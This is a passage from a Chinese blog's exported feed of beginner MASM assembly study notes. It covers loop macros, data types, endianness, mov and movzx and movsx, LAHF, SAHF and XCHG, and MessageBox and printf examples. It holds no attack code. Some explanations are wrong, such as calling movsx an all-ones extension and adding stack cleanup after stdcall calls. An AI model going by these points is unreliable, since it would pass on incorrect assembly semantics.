<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">while</span><span class="token expression">语法使用</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>mov eax<span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">.</span><span class="token keyword">while</span> eax <span class="token operator">&lt;</span> <span class="token number">10</span></pre></td></tr><tr><td data-num="4"></td><td><pre>	inc eax</pre></td></tr><tr><td data-num="5"></td><td><pre>	call WriteDec</pre></td></tr><tr><td data-num="6"></td><td><pre>	call Crlf</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">.</span>endw</pre></td></tr></table></figure><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">do</span> <span class="token expression"><span class="token keyword">while</span>语法使用</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>mov eax<span class="token punctuation">,</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">.</span>repeat</pre></td></tr><tr><td data-num="4"></td><td><pre>	inc eax</pre></td></tr><tr><td data-num="5"></td><td><pre>	call WriteDec</pre></td></tr><tr><td data-num="6"></td><td><pre>	call Crlf</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">.</span>until eax <span class="token operator">==</span> <span class="token number">10</span></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>SNote</category>
      </categories>
      <tags>
        <tag>SNote</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言Studying Note之定义数据类型和数据传送指令学习</title>
    <url>/article/1c336d24.html</url>
    <content><![CDATA[<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/3893ead1f7e49ff9f0018e63d94d21d.jpg" alt="image-3893ead1f7e49ff9f0018e63d94d21d" /></p>
<h2 id="定义数据类型"><a class="anchor" href="#定义数据类型">#</a> 定义数据类型</h2>
<h3 id="内部数据类型"><a class="anchor" href="#内部数据类型">#</a> 内部数据类型</h3>
<h4 id="整数"><a class="anchor" href="#整数">#</a> 整数</h4>
<ul>
<li>BYTE 8 位（无符号）</li>
<li>SBYTE 8 位（有符号）</li>
<li>WORD 16 位（无符号）</li>
<li>SWORD 16 位（有符号）</li>
<li>DWORD 32 位（无符号）</li>
<li>SDWORD 32 位（有符号）</li>
<li>FWORD 48 位 保护模式中的远指针</li>
<li>QWORD 64 位 整数</li>
<li>TBYTE 80 位 整数</li>
</ul>
<h4 id="实数"><a class="anchor" href="#实数">#</a> 实数</h4>
<ul>
<li>REAL4 32 位 短实数</li>
<li>REAL8 64 位 长实数</li>
<li>REAL10 80 位 扩展实数</li>
</ul>
<h4 id="伪指令"><a class="anchor" href="#伪指令">#</a> 伪指令</h4>
<ul>
<li>db 8 位整数 相当于 C 语言中的 char 可以用来保存 ASCII</li>
<li>dw 16 位整数</li>
<li>dd 32 位 整数或实数</li>
<li>dq 64 位 整数或实数</li>
<li>dt 80 位 整数</li>
</ul>
<p>测试样例</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>sz <span class="token operator">=</span> <span class="token string">"my name is 21r000!"</span></pre></td></tr><tr><td data-num="16"></td><td><pre>szStr db <span class="token string">"my name is 21r000!"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span>字符串</pre></td></tr><tr><td data-num="17"></td><td><pre>num dword <span class="token number">5</span><span class="token punctuation">;</span>整数型</pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="20"></td><td><pre>main proc</pre></td></tr><tr><td data-num="21"></td><td><pre>	mov eax<span class="token punctuation">,</span><span class="token number">5</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	add eax<span class="token punctuation">,</span>num</pre></td></tr><tr><td data-num="23"></td><td><pre>	push offset szStr</pre></td></tr><tr><td data-num="24"></td><td><pre>	call crt_printf</pre></td></tr><tr><td data-num="25"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="27"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="28"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="29"></td><td><pre>END main</pre></td></tr></table></figure><p>运行结果</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220123195729201.png" alt="image-20220123195729201" /></p>
<p>定义数组类型</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">;</span>数组</pre></td></tr><tr><td data-num="2"></td><td><pre>arrNum dword <span class="token number">20</span> <span class="token function">dup</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">;</span><span class="token operator">=</span>arrNum<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr></table></figure><p>代码块填写格式</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>mov <span class="token punctuation">[</span>arrNum<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="2"></td><td><pre>mov <span class="token punctuation">[</span>arrNum <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">1</span></pre></td></tr><tr><td data-num="3"></td><td><pre>mov <span class="token punctuation">[</span>arrNum <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span></pre></td></tr></table></figure><p>测试样例</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>sz <span class="token operator">=</span> <span class="token string">"my name is 21r000!"</span></pre></td></tr><tr><td data-num="16"></td><td><pre>szStr db <span class="token string">"my name is 21r000!"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span>字符串</pre></td></tr><tr><td data-num="17"></td><td><pre>num dword <span class="token number">5</span><span class="token punctuation">;</span>整数型</pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">;</span>数组</pre></td></tr><tr><td data-num="19"></td><td><pre>arrNum dword <span class="token number">20</span> <span class="token function">dup</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">;</span><span class="token operator">=</span>arrNum<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="23"></td><td><pre>main proc</pre></td></tr><tr><td data-num="24"></td><td><pre>	mov <span class="token punctuation">[</span>arrNum<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	mov <span class="token punctuation">[</span>arrNum <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">1</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	mov <span class="token punctuation">[</span>arrNum <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span></pre></td></tr><tr><td data-num="27"></td><td><pre>	push offset szStr</pre></td></tr><tr><td data-num="28"></td><td><pre>	call crt_printf</pre></td></tr><tr><td data-num="29"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="30"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="31"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="32"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="33"></td><td><pre>END main</pre></td></tr></table></figure><p>运行测试</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220123200540676.png" alt="image-20220123200540676" /></p>
<h3 id="大端序与小端序"><a class="anchor" href="#大端序与小端序">#</a> 大端序与小端序</h3>
<p>计算机硬件有两种储存数据的方式：大端字节序（big endian）和小端字节序（little endian）。</p>
<blockquote>
<ul>
<li>大端字节序：高位字节在前，低位字节在后</li>
<li>小端字节序：低位字节在前，高位字节在后</li>
</ul>
</blockquote>
<p>下面举例说明</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>sz <span class="token operator">=</span> <span class="token string">"my name is 21r000!"</span></pre></td></tr><tr><td data-num="16"></td><td><pre>szStr db <span class="token string">"my name is 21r000!"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span>字符串</pre></td></tr><tr><td data-num="17"></td><td><pre>num dword <span class="token number">5</span><span class="token punctuation">;</span>整数型</pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">;</span>数组</pre></td></tr><tr><td data-num="19"></td><td><pre>arrNum dword <span class="token number">20</span> <span class="token function">dup</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">;</span><span class="token operator">=</span>arrNum<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="23"></td><td><pre>main proc</pre></td></tr><tr><td data-num="24"></td><td><pre>	mov <span class="token punctuation">[</span>arrNum<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">01234567</span>h</pre></td></tr><tr><td data-num="25"></td><td><pre>	mov <span class="token punctuation">[</span>arrNum <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">11111111</span>h</pre></td></tr><tr><td data-num="26"></td><td><pre>	mov <span class="token punctuation">[</span>arrNum <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">22222222</span>h</pre></td></tr><tr><td data-num="27"></td><td><pre>	push offset szStr</pre></td></tr><tr><td data-num="28"></td><td><pre>	call crt_printf</pre></td></tr><tr><td data-num="29"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="30"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="31"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="32"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="33"></td><td><pre>END main</pre></td></tr></table></figure><p>测试运行后，取地址查看</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220123201813924.png" alt="image-20220123201813924" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220123201932890.png" alt="image-20220123201932890" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220123202447990.png" alt="image-20220123202447990" /></p>
<p>可以发现是按低位字节在前，高位字节在后的方式排序，即： <code>67 45 23 01</code>  的格式。这种称为<strong>小端序</strong>；</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220123203446973.png" alt="image-20220123203446973" /></p>
<p>而如果像我们正常数数的方式排列的，如： <code>01 23 45 67</code>  的格式，则称为<strong>大端序</strong>。所以也称大端序是人类读写数值的方法。</p>
<h2 id="数据传送指令"><a class="anchor" href="#数据传送指令">#</a> 数据传送指令</h2>
<h3 id="操作数类型"><a class="anchor" href="#操作数类型">#</a> 操作数类型</h3>
<ul>
<li>立即数：0，1，2，3，4，5，6，7，8，9 等</li>
<li>寄存器操作数 eax，ebx</li>
<li>内存操作数</li>
</ul>
<h3 id="寄存器操作数"><a class="anchor" href="#寄存器操作数">#</a> 寄存器操作数</h3>
<h4 id="reg通用寄存器"><a class="anchor" href="#reg通用寄存器">#</a> reg：通用寄存器</h4>
<ul>
<li>reg8：8 位</li>
<li>reg16：16 位</li>
<li>reg32：32 位</li>
</ul>
<p><strong>sreg：段寄存器</strong></p>
<h4 id="imm立即数"><a class="anchor" href="#imm立即数">#</a> imm：立即数</h4>
<ul>
<li>imm8：8 位立即数</li>
<li>imm16：16 位立即数</li>
<li>imm32：32 位立即数</li>
</ul>
<h4 id="mem内存"><a class="anchor" href="#mem内存">#</a> mem：内存</h4>
<ul>
<li>mem8：8 位内存</li>
<li>mem16：16 位内存</li>
<li>mem32：32 位内存</li>
</ul>
<h3 id="mov的用法"><a class="anchor" href="#mov的用法">#</a> mov 的用法</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>mov 目的操作数 源操作数</pre></td></tr></table></figure><p>mov a,15 它就相当于 C 语言中的 int a = 15，a 为目的操作数，15 为源操作数</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>mov reg<span class="token punctuation">,</span>reg<span class="token punctuation">;</span>从寄存器到寄存器，把一个寄存器的复制到另一个寄存器</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>mov mem<span class="token punctuation">,</span>reg<span class="token punctuation">;</span>把寄存器中的值拷贝到内存中</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>mov reg<span class="token punctuation">,</span>mem<span class="token punctuation">;</span>把内存中的值复制到寄存器中</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>mov mem<span class="token punctuation">,</span>imm<span class="token punctuation">;</span>把立即数拷贝到内存中</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>mov reg<span class="token punctuation">,</span>imm<span class="token punctuation">;</span>把立即数存到寄存器中</pre></td></tr></table></figure><p>那么如何利用 mov 将较小的值传输到较大的值呢？</p>
<p>例如：将 reg16 传输到 reg32 当中</p>
<p>因为 32 寄存器存在高低位以 eax 为例，如 mov eax,cx，eax 第 16 位是 ax，而 ax 还分为 ah，al，所以说 ax 位 16 位而 al 为 8 位</p>
<p>如果要将 16 位赋值到 32 位寄存器，这个时候就要用 ax 来接收 cx，而这个时候就要对 eax 进行初始化，否则会出现不必要的错误，例如 mov eax,FFFFFFFF</p>
<p>而除了这种直接给它进行初始化方式的方法外，还存在另一种方法，通过 movzx 指令实现</p>
<p><strong>movzx 指令则是用来进行全零扩展，并进数据传送</strong></p>
<p>例如：movzx eax,cx，若此时 cx 为 1234，那么 eax 则表示为 00001234</p>
<p>二进制表示为</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>eax <span class="token operator">=</span> <span class="token number">1010101010101010</span></pre></td></tr><tr><td data-num="2"></td><td><pre>cx <span class="token operator">=</span> <span class="token number">10101010</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">;</span>填充为：<span class="token number">0000000010101010</span></pre></td></tr></table></figure><p>除全零扩展之外还存在全一扩展</p>
<p><strong>movsx 指令则是用来进行全一扩展，并进数据传送</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>eax <span class="token operator">=</span> <span class="token number">1010101010101010</span></pre></td></tr><tr><td data-num="2"></td><td><pre>cx <span class="token operator">=</span> <span class="token number">10101010</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">;</span>填充为：<span class="token number">1111111110101010</span></pre></td></tr></table></figure><h3 id="lahf"><a class="anchor" href="#lahf">#</a> LAHF</h3>
<p>LAHF 也可进行数据传送：用来加载状态标识到 ah 寄存器中，ah 为 ax 中高 8 位而 al 为低 8 位</p>
<p>lahf 是单指令运算符，无操作数，但会会 ah 的 8 位寄存器产生影响</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>lahf</pre></td></tr><tr><td data-num="2"></td><td><pre>mov flag<span class="token punctuation">,</span>ah</pre></td></tr></table></figure><h3 id="sahf"><a class="anchor" href="#sahf">#</a> SAHF</h3>
<p>sahf 会将 ah 中的值拷贝会 flag 当中，与 lahf 作用相反</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>mov ah<span class="token punctuation">,</span>flag</pre></td></tr><tr><td data-num="2"></td><td><pre>sahf</pre></td></tr></table></figure><h3 id="xchg"><a class="anchor" href="#xchg">#</a> XCHG</h3>
<p>只对寄存器和内存进行交换，无立即数</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>xchg reg<span class="token punctuation">,</span>reg<span class="token punctuation">;</span>将寄存器中的值进行交换</pre></td></tr><tr><td data-num="2"></td><td><pre>xchg reg<span class="token punctuation">,</span>mem<span class="token punctuation">;</span>将内存和寄存器中的值进行交换</pre></td></tr><tr><td data-num="3"></td><td><pre>xchg mem<span class="token punctuation">,</span>reg<span class="token punctuation">;</span>将寄存器和内存中的值进行交换</pre></td></tr></table></figure>]]></content>
      <categories>
        <category>SNote</category>
      </categories>
      <tags>
        <tag>SNote</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言Studying Note之控制台程序的输入与输出</title>
    <url>/article/c3dea2a1.html</url>
    <content><![CDATA[<p>我们都知道在 C 语言中的输入输出中最常用的是 scanf 和 printf，其它的比如 gets 和 puts；而在 C++ 中的标准输入输出流一般用 cin 和 cout，那么汇编语言中的输入输出方式是什么样子的呢？接下来我们用 “Hello World!” 来进行学习。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/dfc8e658c198a318b1f053f430bc271.jpg" alt="image-dfc8e658c198a318b1f053f430bc271" /></p>
<p><strong>两种方式：</strong></p>
<ul>
<li>
<p>一种方式就是使用 API，类似于 MessageBox，然后直接写到控制台上</p>
</li>
<li>
<p>另一种是使用一个 MessageBox，来弹出一个消息框。</p>
</li>
</ul>
<h3 id="弹窗版的hello-world"><a class="anchor" href="#弹窗版的hello-world">#</a> 弹窗版的 Hello World!</h3>
<p><strong>定义弹窗的字符串</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="2"></td><td><pre>text db <span class="token string">"Hello World!"</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">;</span>定义弹窗的字符串</pre></td></tr></table></figure><p><strong>调用 MessageBox</strong></p>
<p>MessageBox 的四个参数</p>
<ol>
<li>句柄</li>
<li>内容</li>
<li>标题</li>
<li>按钮，比如：确定，取消之类</li>
</ol>
<p>按照从右往左的压参的方式</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">;</span>调用MessageBox</pre></td></tr><tr><td data-num="2"></td><td><pre>push <span class="token number">0</span><span class="token punctuation">;</span>按钮</pre></td></tr><tr><td data-num="3"></td><td><pre>push offset text<span class="token punctuation">;</span>push 标题</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">;</span>OFFSET是将数值回送变量或标号的偏移地址值<span class="token punctuation">.</span> </pre></td></tr><tr><td data-num="5"></td><td><pre>push offset text<span class="token punctuation">;</span>push 容</pre></td></tr><tr><td data-num="6"></td><td><pre>push <span class="token number">0</span><span class="token punctuation">;</span>push 句柄</pre></td></tr><tr><td data-num="7"></td><td><pre>call MessageBox<span class="token punctuation">;</span>完成调用</pre></td></tr></table></figure><p><strong>完整样例</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="10"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="13"></td><td><pre>text db <span class="token string">"Hello World!"</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">;</span>定义弹窗的字符串</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="17"></td><td><pre>main proc</pre></td></tr><tr><td data-num="18"></td><td><pre>	<span class="token punctuation">;</span>调用MessageBox</pre></td></tr><tr><td data-num="19"></td><td><pre>	push <span class="token number">0</span><span class="token punctuation">;</span>按钮</pre></td></tr><tr><td data-num="20"></td><td><pre>	push offset text<span class="token punctuation">;</span>push 标题</pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token punctuation">;</span>OFFSET是将数值回送变量或标号的偏移地址值<span class="token punctuation">.</span> </pre></td></tr><tr><td data-num="22"></td><td><pre>	push offset text<span class="token punctuation">;</span>push 容</pre></td></tr><tr><td data-num="23"></td><td><pre>	push <span class="token number">0</span><span class="token punctuation">;</span>push 句柄</pre></td></tr><tr><td data-num="24"></td><td><pre>	call MessageBox<span class="token punctuation">;</span>完成调用</pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token punctuation">;</span>堆栈进行防溢</pre></td></tr><tr><td data-num="26"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">;</span>四个参数，一个参数<span class="token number">32</span>位，四个<span class="token number">32</span>位的<span class="token number">4</span>个字节</pre></td></tr><tr><td data-num="27"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="28"></td><td><pre>	call ExitProcess<span class="token punctuation">;</span>退出进程</pre></td></tr><tr><td data-num="29"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="30"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="31"></td><td><pre>END main</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220121204413135.png" alt="image-20220121204413135" /></p>
<p><strong>运行结果</strong></p>
<p>可以看到按钮是 &quot;确定&quot;，然后标题和内容是 &quot;Hello World!&quot;</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220121202832394.png" alt="image-20220121202832394" /></p>
<h3 id="控制台输出hello-world"><a class="anchor" href="#控制台输出hello-world">#</a> 控制台输出 Hello World!</h3>
<p>在初级初级汇编中，因为我们都是在控制台上来写这个代码的，那么我们肯定就要知道怎么在控制台上来接收参数和写出东西；</p>
<p>那么其实呢，我们有两种方式</p>
<ul>
<li>一种是调用 MessageBox 类似的 API，写控制台，就是往控制台怎么写流的一个 API</li>
<li>另一种更便捷的方式，就是调用一个系统导出的 C 的库函数</li>
</ul>
<p>就是说如果直接调用一个 C 的库函数，我们就可以直接调用 printf 和 scanf，但只是调用方法不太一样，在调入之前，我们需要先给它包含一个头文件，因为我们这个 scanf 和 printf 其实都是在一个动态链接库里进行一个导出的，所以说呢，我们在使用之前呢，还是要把它这个头文件加进去</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="2"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr></table></figure><p>包含完它的头文件和 lib 之后我们就可以正常使用了.</p>
<p><strong>调用 printf</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>call crt_printf</pre></td></tr></table></figure><p><strong>完整样例</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token 